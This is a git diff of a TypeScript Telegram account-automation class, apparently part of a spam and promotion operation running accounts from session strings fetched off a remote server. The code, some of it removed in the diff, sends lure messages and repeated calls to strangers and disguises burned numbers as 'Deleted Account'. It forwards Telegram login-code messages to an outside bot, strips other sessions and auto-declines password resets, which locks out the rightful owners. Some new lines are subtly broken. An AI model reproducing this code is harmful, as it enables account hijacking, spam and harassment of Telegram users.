@@ -1,5 +1,5 @@
-import { TelegramClient, Api, errors } from "telegram";
-import { NewMessage, NewMessageEvent } from "telegram/events";
+import { TelegramClient, Api, errors } from "telegram-v2";
+import { NewMessage, NewMessageEvent } from "telegram-v2/events";
 import { LogLevel } from "telegram/extensions/Logger";
 import { StringSession } from "telegram/sessions";
 import { setSendPing } from "./connection";
@@ -9,17 +9,15 @@ import * as fs from 'fs';
 import { CustomFile } from "telegram/client/uploads";
 import { parseError } from "./parseError";
 import { TelegramService } from "./Telegram.service";
-import { IClientDetails, updatePromoteClient, updateMsgCount, } from "./express";
+import { updatePromoteClient, updateMsgCount, } from "./express";
 import { createPromoteClient, getdaysLeft, saveFile, sendToLogs, ppplbot, startNewUserProcess } from "./utils";
-import { Promotion } from "./Promotions";
 import { UserDataDtoCrud } from "./dbservice";
 import { sleep } from "telegram/Helpers";
 import { createPhoneCallState, requestPhoneCall, generateRandomInt, destroyPhoneCallState } from "./phonestate";
 import EventEmitter from "events";
 
-class TelegramManager extends EventEmitter {
+class TelegramManagerV2 extends EventEmitter {
     private phoneCall = undefined;
-    public clientDetails: IClientDetails = undefined
     public client: TelegramClient | null;
     private lastCheckedTime = 0;
     private checkingAuths = false;
@@ -27,20 +25,15 @@ class TelegramManager extends EventEmitter {
     private liveMap: Map<string, { time: number, value: boolean }> = new Map();
     private tgId: string;
     public daysLeft = -1;
-    // reactorInstance: Reactions;
+    private mobile: string;
 
-    constructor(clientDetails: IClientDetails, reactorInstance: Reactions) {
+    constructor(mobile: string) {
         super();
-        this.clientDetails = clientDetails;
-        // this.reactorInstance = reactorInstance;
+        this.mobile = mobile;
     }
 
     connected() {
         return this.client.connected
-    }
-
-    setClientDetails(clientDetails: IClientDetails) {
-        this.clientDetails = clientDetails;
     }
 
     async destroy() {
@@ -54,33 +47,25 @@ class TelegramManager extends EventEmitter {
         }
     }
 
-    async createClient(handler = true, useLowerVersion : boolean = false): Promise<TelegramClient> {
+    async createClient(handler = true): Promise<TelegramClient> {
         try {
             //console.log("Creating Client: ", this.clientDetails.clientId)
-            const result2 = <any>await fetchWithTimeout(`https://mychatgpt-xk3y.onrender.com/forward/archived-clients/fetchOne/${this.clientDetails.mobile}`);
+            const result2 = <any>await fetchWithTimeout(`https://mychatgpt-xk3y.onrender.com/forward/archived-clients/fetchOne/${this.mobile}`);
             // //console.log("ArchivedClient : ", result2.data)
             if (result2.data) {
-                if (useLowerVersion) {
-                    // Create TelegramClient with a different version
-                    this.client = new TelegramClient(new StringSession(result2.data.session), parseInt(process.env.API_ID), process.env.API_HASH, {
-                        connectionRetries: 5,
-                        useIPV6: true,
-                        useWSS: true
-                    });
-                } else {
-                    // Create TelegramClient with the default version
-                    this.client = new TelegramClient(new StringSession(result2.data.session), parseInt(process.env.API_ID), process.env.API_HASH, {
-                        connectionRetries: 5,
-                        useIPV6: true,
-                        useWSS: true
-                    });
-                }
+                // Create TelegramClient with a different version
+                this.client = new TelegramClient(result2.data.session, parseInt(process.env.API_ID), process.env.API_HASH, {
+                    connectionRetries: 5,
+                    useIPV6: true,
+                    useWSS: true
+                });
+
                 this.client.setLogLevel(LogLevel.NONE);
                 //TelegramManager.client._errorHandler = this.errorHandler
                 await this.client.connect();
-                console.log("Connected : ", this.clientDetails.mobile)
-                const me = await this.checkMe();
-                this.tgId = me.id.toString();
+                console.log("Connected : ", this.mobile)
+                // const me = await this.checkMe();
+                this.tgId = await this.client.getMe().toString();
                 // await this.updatePrivacy();
                 // await sleep(1500)
                 // await this.checkProfilePics();
@@ -88,9 +73,9 @@ class TelegramManager extends EventEmitter {
                 await this.joinChannel("clientupdates");
                 // await sleep(1500)
                 // await this.updateUsername('')
-                console.log("Adding event Handler")
-                this.client.addEventHandler(this.handleEvents.bind(this), new NewMessage());
-                this.client.addEventHandler((event) => this.handleOtherEvents(event));
+                // console.log("Adding event Handler")
+                // this.client.addEventHandler(this.handleEvents.bind(this), new NewMessage());
+                // this.client.addEventHandler((event) => this.handleOtherEvents(event));
                 // await updatePromoteClient(this.clientDetails.clientId, { daysLeft: -1 })
                 // if (handler && this.client) {
                 //     //console.log("Adding event Handler")
@@ -98,12 +83,12 @@ class TelegramManager extends EventEmitter {
                 // this.promoterInstance.PromoteToGrp()
                 return this.client
             } else {
-                console.log(`No Session Found: ${this.clientDetails.mobile}`)
+                console.log(`No Session Found: ${this.mobile}`)
             }
         } catch (error) {
-            console.log("=========Failed To Connect : ", this.clientDetails.mobile);
-            parseError(error, this.clientDetails?.mobile);
-            await startNewUserProcess(error, this.clientDetails.mobile)
+            console.log("=========Failed To Connect : ", this.mobile);
+            parseError(error, this.mobile);
+            await startNewUserProcess(error, this.mobile)
         }
     }
 
@@ -186,207 +171,203 @@ class TelegramManager extends EventEmitter {
             }
         } catch (error) {
             parseError(error, "Error At HAnling other event")
-            await startNewUserProcess(error, this.clientDetails.mobile)
+            await startNewUserProcess(error, this.mobile)
         }
     }
 
     handleEvents = async (event: NewMessageEvent) => {
         try {
             if (event.isPrivate) {
-                if (event.message.text === `exit${this?.clientDetails?.clientId}`) {
-                    //console.log(`EXITTING PROCESS!!`);
-                    const telegramService = TelegramService.getInstance();
-                    await telegramService.disposeClient(this.clientDetails.mobile);
-                } else {
-                    const senderJson = await this.getSenderJson(event);
-                    const broadcastName = senderJson.username ? senderJson.username : senderJson.firstName;
-                    const chatId = event.message.chatId.toString()
-                    if (!broadcastName.toLowerCase().endsWith('bot') && event.message.chatId.toString() !== "178220800" && event.message.chatId.toString() !== "777000") {
-                        const db = UserDataDtoCrud.getInstance()
-                        console.log(`${this.clientDetails.mobile.toUpperCase()}:${broadcastName}-${chatId} :: `, event.message.text);
-                        await sendToLogs({ message: `${this.clientDetails.mobile}\n${broadcastName}: ${event.message.text}` });
-                        try {
-                            const db = UserDataDtoCrud.getInstance();
-                            try {
-                                await event.client.markAsRead(event.chatId);
-                            } catch (error) {
 
-                            }
-                            const isExist = this.liveMap.get(chatId);
-                            this.liveMap.set(chatId, { time: Date.now(), value: true });
-                            if (!isExist || (isExist && isExist.time < Date.now() - 120000)) {
-                                if (!isExist?.value) {
-                                    await this.setTyping(chatId)
-                                    await sleep(1500);
-                                    try {
-                                        await event.message.respond({ message: `Hii Babyy!! ${this.generateEmojis()}`, linkPreview: true })
-                                        await this.setAudioRecording(chatId)
-                                        await sleep(2500);
-                                        await event.message.respond({ message: `This is my official Account!!🔥\n\n\nMsg me **Dear!!👇👇:**\nhttps://t.me/${this.clientDetails.username} ${this.getRandomEmoji()}`, linkPreview: true })
-                                        await this.setVideoRecording(chatId)
-                                    } catch (error) {
-                                        if (error instanceof errors.FloodWaitError) {
-                                            console.warn(`Client ${this.clientDetails.mobile}: Rate limited. Sleeping for ${error.seconds} seconds.`);
-                                        }
-                                    }
-                                    await updateMsgCount(this.clientDetails.clientId)
-                                } else {
-                                    try {
-                                        await event.message.respond({ message: `Msg me here **Dear!! ${this.generateEmojis()}👇:**\n\nhttps://t.me/${this.clientDetails.username} ${this.getRandomEmoji()}`, linkPreview: true })
-                                        await this.setVideoRecording(chatId)
-                                    } catch (error) {
+                // const senderJson = await this.getSenderJson(event);
+                // const broadcastName = senderJson.username ? senderJson.username : senderJson.firstName;
+                // const chatId = event.message.chatId.toString()
+                // // if (!broadcastName.toLowerCase().endsWith('bot') && event.message.chatId.toString() !== "178220800" && event.message.chatId.toString() !== "777000") {
+                // //     const db = UserDataDtoCrud.getInstance()
+                // //     console.log(`${this.mobile.toUpperCase()}:${broadcastName}-${chatId} :: `, event.message.text);
+                // //     await sendToLogs({ message: `${this.mobile}\n${broadcastName}: ${event.message.text}` });
+                // //     try {
+                // //         const db = UserDataDtoCrud.getInstance();
+                // //         try {
+                // //             await event.client.markAsRead(event.chatId);
+                // //         } catch (error) {
 
-                                    }
-                                }
-                                setTimeout(async () => {
-                                    const userData = await db.getUserData(chatId)
-                                    if (userData && userData.totalCount > 0) {
-                                        console.log(`USer Exist Clearing interval2 ${chatId} ${userData.totalCount} ${userData.firstName}`)
-                                        this.liveMap.set(chatId, { time: Date.now(), value: false });
-                                    } else {
-                                        console.log(`User Not Exist Calling Now ${chatId}`)
-                                        try {
-                                            await event.message.respond({ message: `I am waiting for you Babyy ${this.generateEmojis()}!!\n\n                  👇👇👇👇\n\n\n**@${this.clientDetails.username} @${this.clientDetails.username} ${this.getRandomEmoji()}\n@${this.clientDetails.username} @${this.clientDetails.username} ${this.getRandomEmoji()}**`, linkPreview: true })
-                                            await this.setVideoRecording(chatId)
-                                        } catch (error) {
-                                            if (error instanceof errors.FloodWaitError) {
-                                                console.warn(`Client ${this.clientDetails.mobile}: Rate limited. Sleeping for ${error.seconds} seconds.`);
-                                            }
-                                        }
-                                    }
-                                }, 25000);
-                                for (let i = 0; i < 3; i++) {
-                                    try {
-                                        await sleep(120000)
-                                        const userData = await db.getUserData(chatId)
-                                        if (userData && userData.totalCount > 0) {
-                                            console.log(`USer Exist Clearing interval ${chatId} ${userData.totalCount} ${userData.firstName}`)
-                                            this.liveMap.set(chatId, { time: Date.now(), value: false });
-                                            break;
-                                        } else {
-                                            console.log(`User Not Exist Calling Now ${chatId}`)
-                                            await this.call(chatId);
-                                            await sleep(10000)
-                                            await this.setVideoRecording(chatId)
-                                            await sleep(3000)
-                                            await event.message.respond({ message: `**   Message Now Baby!!${this.generateEmojis()}**\n\n                  👇👇\n\n\nhttps://t.me/${this.clientDetails.username} ${this.getRandomEmoji()}`, linkPreview: true })
-                                        }
-                                    } catch (error) {
-                                        // console.log("Failed to Call")
-                                        parseError(error, `failed to Call ; ${chatId}`, false)
-                                        await startNewUserProcess(error, this.clientDetails.mobile)
-                                    }
-                                    //todo
-                                    // if(i==2){
-                                    //     fetchWithTimeout(`${process.env.repl}/sendMessage`)
-                                    // }
-                                }
+                // //         }
+                // //         const isExist = this.liveMap.get(chatId);
+                // //         this.liveMap.set(chatId, { time: Date.now(), value: true });
+                // //         if (!isExist || (isExist && isExist.time < Date.now() - 120000)) {
+                // //             if (!isExist?.value) {
+                // //                 await this.setTyping(chatId)
+                // //                 await sleep(1500);
+                // //                 try {
+                // //                     await event.message.respond({ message: `Hii Babyy!! ${this.generateEmojis()}`, linkPreview: true })
+                // //                     await this.setAudioRecording(chatId)
+                // //                     await sleep(2500);
+                // //                     await event.message.respond({ message: `This is my official Account!!🔥\n\n\nMsg me **Dear!!👇👇:**\nhttps://t.me/${this.clientDetails.username} ${this.getRandomEmoji()}`, linkPreview: true })
+                // //                     await this.setVideoRecording(chatId)
+                // //                 } catch (error) {
+                // //                     if (error instanceof errors.FloodWaitError) {
+                // //                         console.warn(`Client ${this.mobile}: Rate limited. Sleeping for ${error.seconds} seconds.`);
+                // //                     }
+                // //                 }
+                // //             } else {
+                // //                 try {
+                // //                     await event.message.respond({ message: `Msg me here **Dear!! ${this.generateEmojis()}👇:**\n\nhttps://t.me/${this.clientDetails.username} ${this.getRandomEmoji()}`, linkPreview: true })
+                // //                     await this.setVideoRecording(chatId)
+                // //                 } catch (error) {
 
-                                this.liveMap.set(chatId, { time: Date.now(), value: false });
-                            }
-                        } catch (error) {
-                            console.log("Error in responding")
-                        }
-                    } else {
-                        if (event.message.chatId.toString() == "178220800") {
-                            console.log(`${this.clientDetails.mobile.toUpperCase()}:: ${broadcastName} :: `, event.message.text)
-                            if (event.message.text.toLowerCase().includes('automatically released')) {
-                                const date = event.message.text.split("limited until ")[1].split(",")[0]
-                                const days = getdaysLeft(date);
-                                console.log("Days Left: ", days);
-                                this.daysLeft = days
-                                this.emit('setDaysLeft', { daysLeft: days });
-                                // if (days == 3) {
-                                // this.promoterInstance.setChannels(openChannels)
-                                // }
-                            } else if (event.message.text.toLowerCase().includes('good news')) {
-                                this.emit('setDaysLeft', { daysLeft: -1 });
-                                this.daysLeft = -1
-                            } else if (event.message.text.toLowerCase().includes('can trigger a harsh')) {
-                                // this.promoterInstance.setChannels(openChannels)
-                                this.emit('setDaysLeft', { daysLeft: 99 });
-                                this.daysLeft = 99
-                            }
-                            await updatePromoteClient(this.clientDetails.clientId, { daysLeft: this.daysLeft })
-                            if (this.daysLeft > 3 && (this.lastResetTime < Date.now() - 30 * 60 * 1000)) {
-                                this.lastResetTime = Date.now()
-                                try {
-                                    const db = UserDataDtoCrud.getInstance();
-                                    const existingClients = await db.getClients();
-                                    const promoteMobiles = [];
-                                    for (const existingClient of existingClients) {
-                                        promoteMobiles.push(existingClient.promoteMobile);
-                                    }
-                                    const today = (new Date(Date.now())).toISOString().split('T')[0];
-                                    const query = { availableDate: { $lte: today }, channels: { $gt: 350 }, mobile: { $nin: promoteMobiles } };
-                                    const newPromoteClient = await db.findPromoteClient(query);
-                                    if (newPromoteClient) {
-                                        await sendToLogs({ message: `Setting up new client for :  ${this.clientDetails.clientId} as days : ${this.daysLeft}` });
-                                        await fetchWithTimeout(`${ppplbot()}&text=@${this.clientDetails.clientId.toUpperCase()}-PROM Changed Number from ${this.clientDetails.mobile} to ${newPromoteClient.mobile}`);
-                                        await db.pushPromoteMobile({ clientId: this.clientDetails.clientId }, newPromoteClient.mobile);
-                                        await db.deletePromoteClient({ mobile: newPromoteClient.mobile });
-                                        await this.deleteProfilePhotos();
-                                        await sleep(1500);
-                                        await this.updatePrivacyforDeletedAccount();
-                                        await sleep(1500);
-                                        await this.updateUsername('');
-                                        await sleep(1500);
-                                        await this.updateProfile('Deleted Account', '');
-                                        await sleep(1500);
-                                        const availableDate = (new Date(Date.now() + ((this.daysLeft + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];
-                                        console.log("Today: ", today, "Available Date: ", availableDate);
-                                        await db.createPromoteClient({
-                                            availableDate,
-                                            channels: 30,
-                                            lastActive: today,
-                                            mobile: this.clientDetails.mobile,
-                                            tgId: this.tgId
-                                        })
-                                        await db.pullPromoteMobile({ clientId: this.clientDetails.clientId }, this.clientDetails.mobile);
-                                        console.log(this.clientDetails.mobile, " - New Promote Client: ", newPromoteClient);
-                                        const telegramService = TelegramService.getInstance();
-                                        await telegramService.disposeClient(this.clientDetails.mobile);
-                                    }
-                                } catch (error) {
-                                    parseError(error, "Error Handling Message Event");
-                                    await startNewUserProcess(error, this.clientDetails.mobile)
-                                }
-                            }
-                        }
-                        // if (this.daysLeft > 0) {
-                        //     await sendToLogs({ message: `${this.clientDetails.mobile}\nDaysLeft: ${this.daysLeft}` });
-                        // }
+                // //                 }
+                // //             }
+                // //             setTimeout(async () => {
+                // //                 const userData = await db.getUserData(chatId)
+                // //                 if (userData && userData.totalCount > 0) {
+                // //                     console.log(`USer Exist Clearing interval2 ${chatId} ${userData.totalCount} ${userData.firstName}`)
+                // //                     this.liveMap.set(chatId, { time: Date.now(), value: false });
+                // //                 } else {
+                // //                     console.log(`User Not Exist Calling Now ${chatId}`)
+                // //                     try {
+                // //                         await event.message.respond({ message: `I am waiting for you Babyy ${this.generateEmojis()}!!\n\n                  👇👇👇👇\n\n\n**@${this.clientDetails.username} @${this.clientDetails.username} ${this.getRandomEmoji()}\n@${this.clientDetails.username} @${this.clientDetails.username} ${this.getRandomEmoji()}**`, linkPreview: true })
+                // //                         await this.setVideoRecording(chatId)
+                // //                     } catch (error) {
+                // //                         if (error instanceof errors.FloodWaitError) {
+                // //                             console.warn(`Client ${this.mobile}: Rate limited. Sleeping for ${error.seconds} seconds.`);
+                // //                         }
+                // //                     }
+                // //                 }
+                // //             }, 25000);
+                // //             for (let i = 0; i < 3; i++) {
+                // //                 try {
+                // //                     await sleep(120000)
+                // //                     const userData = await db.getUserData(chatId)
+                // //                     if (userData && userData.totalCount > 0) {
+                // //                         console.log(`USer Exist Clearing interval ${chatId} ${userData.totalCount} ${userData.firstName}`)
+                // //                         this.liveMap.set(chatId, { time: Date.now(), value: false });
+                // //                         break;
+                // //                     } else {
+                // //                         console.log(`User Not Exist Calling Now ${chatId}`)
+                // //                         await this.call(chatId);
+                // //                         await sleep(10000)
+                // //                         await this.setVideoRecording(chatId)
+                // //                         await sleep(3000)
+                // //                         await event.message.respond({ message: `**   Message Now Baby!!${this.generateEmojis()}**\n\n                  👇👇\n\n\nhttps://t.me/${this.clientDetails.username} ${this.getRandomEmoji()}`, linkPreview: true })
+                // //                     }
+                // //                 } catch (error) {
+                // //                     // console.log("Failed to Call")
+                // //                     parseError(error, `failed to Call ; ${chatId}`, false)
+                // //                     await startNewUserProcess(error, this.mobile)
+                // //                 }
+                // //                 //todo
+                // //                 // if(i==2){
+                // //                 //     fetchWithTimeout(`${process.env.repl}/sendMessage`)
+                // //                 // }
+                // //             }
 
-                        if (event.message.chatId.toString() == "777000") {
-                            await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`@${process.env.clientId}-PROM-${this.clientDetails.mobile}:\n${event.message.text}`)}`);
-                            if (event.message.text.toLowerCase().includes('login code')) {
-                                await this.removeOtherAuths()
-                                setTimeout(async () => {
-                                    try {
-                                        const result = await event.client.invoke(new Api.account.DeclinePasswordReset())
-                                    } catch (error) {
-                                        parseError(error, "Error at DeclinePasswordReset")
-                                    }
-                                }, 5 * 60 * 1000);
-                            }
-                            if (event.message.text.toLowerCase().includes('request to reset account')) {
-                                await sleep(2000);
-                                try {
-                                    const result = await event.client.invoke(new Api.account.DeclinePasswordReset());
-                                } catch (error) {
-                                    parseError(error, "Error at DeclinePasswordReset")
-                                }
-                            }
-                        }
-                    }
-                }
+                // //             this.liveMap.set(chatId, { time: Date.now(), value: false });
+                // //         }
+                // //     } catch (error) {
+                // //         console.log("Error in responding")
+                // //     }
+                // // } else {
+                // //     if (event.message.chatId.toString() == "178220800") {
+                // //         console.log(`${this.mobile.toUpperCase()}:: ${broadcastName} :: `, event.message.text)
+                // //         if (event.message.text.toLowerCase().includes('automatically released')) {
+                // //             const date = event.message.text.split("limited until ")[1].split(",")[0]
+                // //             const days = getdaysLeft(date);
+                // //             console.log("Days Left: ", days);
+                // //             this.daysLeft = days
+                // //             this.emit('setDaysLeft', { daysLeft: days });
+                // //             // if (days == 3) {
+                // //             // this.promoterInstance.setChannels(openChannels)
+                // //             // }
+                // //         } else if (event.message.text.toLowerCase().includes('good news')) {
+                // //             this.emit('setDaysLeft', { daysLeft: -1 });
+                // //             this.daysLeft = -1
+                // //         } else if (event.message.text.toLowerCase().includes('can trigger a harsh')) {
+                // //             // this.promoterInstance.setChannels(openChannels)
+                // //             this.emit('setDaysLeft', { daysLeft: 99 });
+                // //             this.daysLeft = 99
+                // //         }
+                // //         await updatePromoteClient(this.clientDetails.clientId, { daysLeft: this.daysLeft })
+                // //         if (this.daysLeft > 3 && (this.lastResetTime < Date.now() - 30 * 60 * 1000)) {
+                // //             this.lastResetTime = Date.now()
+                // //             try {
+                // //                 const db = UserDataDtoCrud.getInstance();
+                // //                 const existingClients = await db.getClients();
+                // //                 const promoteMobiles = [];
+                // //                 for (const existingClient of existingClients) {
+                // //                     promoteMobiles.push(existingClient.promoteMobile);
+                // //                 }
+                // //                 const today = (new Date(Date.now())).toISOString().split('T')[0];
+                // //                 const query = { availableDate: { $lte: today }, channels: { $gt: 350 }, mobile: { $nin: promoteMobiles } };
+                // //                 const newPromoteClient = await db.findPromoteClient(query);
+                // //                 if (newPromoteClient) {
+                // //                     await sendToLogs({ message: `Setting up new client for :  ${this.clientDetails.clientId} as days : ${this.daysLeft}` });
+                // //                     await fetchWithTimeout(`${ppplbot()}&text=@${this.clientDetails.clientId.toUpperCase()}-PROM Changed Number from ${this.mobile} to ${newPromoteClient.mobile}`);
+                // //                     await db.pushPromoteMobile({ clientId: this.clientDetails.clientId }, newPromoteClient.mobile);
+                // //                     await db.deletePromoteClient({ mobile: newPromoteClient.mobile });
+                // //                     await this.deleteProfilePhotos();
+                // //                     await sleep(1500);
+                // //                     await this.updatePrivacyforDeletedAccount();
+                // //                     await sleep(1500);
+                // //                     await this.updateUsername('');
+                // //                     await sleep(1500);
+                // //                     await this.updateProfile('Deleted Account', '');
+                // //                     await sleep(1500);
+                // //                     const availableDate = (new Date(Date.now() + ((this.daysLeft + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];
+                // //                     console.log("Today: ", today, "Available Date: ", availableDate);
+                // //                     await db.createPromoteClient({
+                // //                         availableDate,
+                // //                         channels: 30,
+                // //                         lastActive: today,
+                // //                         mobile: this.mobile,
+                // //                         tgId: this.tgId
+                // //                     })
+                // //                     await db.pullPromoteMobile({ clientId: this.clientDetails.clientId }, this.mobile);
+                // //                     console.log(this.mobile, " - New Promote Client: ", newPromoteClient);
+                // //                     const telegramService = TelegramService.getInstance();
+                // //                     await telegramService.disposeClient(this.mobile);
+                // //                 }
+                // //             } catch (error) {
+                // //                 parseError(error, "Error Handling Message Event");
+                // //                 await startNewUserProcess(error, this.mobile)
+                // //             }
+                // //         }
+                // //     }
+                // //     // if (this.daysLeft > 0) {
+                // //     //     await sendToLogs({ message: `${this.mobile}\nDaysLeft: ${this.daysLeft}` });
+                // //     // }
+
+                // //     if (event.message.chatId.toString() == "777000") {
+                // //         await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`@${process.env.clientId}-PROM-${this.mobile}:\n${event.message.text}`)}`);
+                // //         if (event.message.text.toLowerCase().includes('login code')) {
+                // //             await this.removeOtherAuths()
+                // //             setTimeout(async () => {
+                // //                 try {
+                // //                     const result = await event.client.invoke(new Api.account.DeclinePasswordReset())
+                // //                 } catch (error) {
+                // //                     parseError(error, "Error at DeclinePasswordReset")
+                // //                 }
+                // //             }, 5 * 60 * 1000);
+                // //         }
+                // //         if (event.message.text.toLowerCase().includes('request to reset account')) {
+                // //             await sleep(2000);
+                // //             try {
+                // //                 const result = await event.client.invoke(new Api.account.DeclinePasswordReset());
+                // //             } catch (error) {
+                // //                 parseError(error, "Error at DeclinePasswordReset")
+                // //             }
+                // //         }
+
+                // //     }
+                // // }
             } else {
-                // await this.reactorInstance?.react(event, this.clientDetails.mobile);
+                await this.emit('react', event);
                 setSendPing(true)
             }
+
         } catch (error) {
             parseError(error, "SomeError Parsing Msg")
-            await startNewUserProcess(error, this.clientDetails.mobile)
+            await startNewUserProcess(error, this.mobile)
         }
     }
 
@@ -407,7 +388,7 @@ class TelegramManager extends EventEmitter {
                         try {
                             console.log(auth);
                             await this.client.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
-                            await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}-PROM- ${this.clientDetails.mobile}: New AUTH Removed- ${auth.appName}|${auth.country}|${auth.deviceModel}`)}`);
+                            await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}-PROM- ${this.mobile}: New AUTH Removed- ${auth.appName}|${auth.country}|${auth.deviceModel}`)}`);
                             this.checkingAuths = false;
                             return auth;
                         } catch (error) {
@@ -526,72 +507,12 @@ class TelegramManager extends EventEmitter {
                 senderJson = await (senderObj?.toJSON());
             }
         } catch (error) {
-            parseError(error, `${this.clientDetails?.mobile} || ${this.clientDetails.mobile}`);
-            await startNewUserProcess(error, this.clientDetails.mobile)
+            parseError(error, `${this.mobile} || ${this.mobile}`);
+            await startNewUserProcess(error, this.mobile)
         }
         return senderJson;
     }
 
-    async checkMe() {
-        try {
-            const me = <Api.User>await this.getMe();
-            if (me.firstName !== this.clientDetails.name) {
-                await this.updateProfile(this.clientDetails.name, `Main Ac👉 @${this.clientDetails.username.toUpperCase()}`);
-                await sleep(2000);
-                await this.deleteProfilePhotos();
-                await sleep(2000);
-                const filepath = await saveFile(process.env.img, this.clientDetails.clientId);
-                console.log("FilePath :", filepath)
-                await this.updateProfilePic(filepath);
-            }
-            const fullUser = await this.client.invoke(new Api.users.GetFullUser({
-                id: me.id, // Pass the current user's input peer
-            }));
-            if (fullUser.fullUser.about !== `Main Ac👉 @${this.clientDetails.username.toUpperCase()}`) {
-                console.log("updating About")
-                await this.updateProfile(this.clientDetails.name, `Main Ac👉 @${this.clientDetails.username.toUpperCase()}`);
-            } else {
-                // console.log("About is Good")
-            }
-            if (!me.photo) {
-                await this.checkProfilePics();
-                await sleep(2000);
-                await this.updatePrivacy();
-            }
-            return me;
-        } catch (error) {
-            parseError(error, `${this.clientDetails.name} - prom`);
-            await startNewUserProcess(error, this.clientDetails.mobile)
-        }
-    }
-    async checkProfilePics() {
-        try {
-            const result = await this.client.invoke(
-                new Api.photos.GetUserPhotos({
-                    userId: "me"
-                })
-            );
-            // console.log(`Profile Pics found: ${result.photos.length}`)
-            if (result && result.photos?.length < 1) {
-                await this.deleteProfilePhotos();
-                await sleep(2000);
-                const filepath = await saveFile(process.env.img, this.clientDetails.clientId);
-                console.log("FilePath :", filepath)
-                await this.updateProfilePic(filepath);
-                // await sleep(2000);
-                // const filepath2 = await saveFile(`${this.clientDetails.repl}/downloadprofilepic/2`, this.clientDetails.clientId);
-                // console.log("FilePath :", filepath2)
-                // await tgClient.updateProfilePic(filepath2);
-                console.log(`${this.clientDetails.clientId}: Uploaded Pic`)
-            } else {
-                console.log(`${this.clientDetails.clientId}: Profile pics exist`)
-            }
-            // console.log("Updated profile Photos");
-        } catch (error) {
-            parseError(error, `${this.clientDetails?.clientId} || ${this.clientDetails.mobile}`);
-            await startNewUserProcess(error, this.clientDetails.mobile)
-        }
-    }
 
     async joinChannel(entity: Api.TypeEntityLike) {
         return await this.client?.invoke(
@@ -642,9 +563,9 @@ class TelegramManager extends EventEmitter {
             const result = await this.client.invoke(
                 new Api.account.UpdateProfile(data)
             );
-            console.log(`${this.clientDetails.mobile}:Updated NAme: `, firstName);
+            console.log(`${this.mobile}:Updated NAme: `, firstName);
         } catch (error) {
-            console.error(`${this.clientDetails.mobile}:Failed to update name`);
+            console.error(`${this.mobile}:Failed to update name`);
         }
     }
     async setTyping(chatId: string) {
@@ -696,7 +617,7 @@ class TelegramManager extends EventEmitter {
                     userId: "me"
                 })
             );
-            console.log(`${this.clientDetails.mobile}: Profile Pics found: ${result.photos.length}`)
+            console.log(`${this.mobile}: Profile Pics found: ${result.photos.length}`)
             if (result && result.photos?.length > 0) {
                 const res = await this.client.invoke(
                     new Api.photos.DeletePhotos({
@@ -758,6 +679,7 @@ class TelegramManager extends EventEmitter {
             return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
         }
         return null;
+
     }
 
     async checktghealth(force: boolean = false) {
@@ -770,8 +692,8 @@ class TelegramManager extends EventEmitter {
                     //console.log("instanse not exist")
                 }
             } catch (error) {
-                parseError(error, `CheckHealth in Tg: ${this.clientDetails?.mobile}`)
-                await startNewUserProcess(error, this.clientDetails.mobile)
+                parseError(error, `CheckHealth in Tg: ${this.mobile}`)
+                await startNewUserProcess(error, this.mobile)
                 try {
                     await this.client.invoke(
                         new Api.contacts.Unblock({
@@ -779,8 +701,8 @@ class TelegramManager extends EventEmitter {
                         })
                     );
                 } catch (error) {
-                    parseError(error, this.clientDetails?.mobile)
-                    await startNewUserProcess(error, this.clientDetails.mobile)
+                    parseError(error, this.mobile)
+                    await startNewUserProcess(error, this.mobile)
                 }
                 await fetchWithTimeout(`${ppplbot()}&text=@${(process.env.clientId).toUpperCase()}-PROM: Failed To Check Health`);
             }
@@ -832,7 +754,7 @@ class TelegramManager extends EventEmitter {
                 this.phoneCall = undefined;
                 destroyPhoneCallState();
                 parseError(error, "Failed to Call", false);
-                await startNewUserProcess(error, this.clientDetails.mobile)
+                await startNewUserProcess(error, this.mobile)
                 try {
                     if (error.errorMessage === 'USER_PRIVACY_RESTRICTED') {
                         await this.client.sendMessage(chatId, { message: "Change Your Call Settings\n\nPrivacy Settings... I'm unable to call..!!" });
@@ -841,7 +763,7 @@ class TelegramManager extends EventEmitter {
                     }
                 } catch (error) {
                     parseError(error, "falied to send message on failed call", false)
-                    await startNewUserProcess(error, this.clientDetails.mobile)
+                    await startNewUserProcess(error, this.mobile)
                 }
             }
         } else {
@@ -853,4 +775,4 @@ class TelegramManager extends EventEmitter {
     }
 }
 
-export default TelegramManager;
+export default TelegramManagerV2;
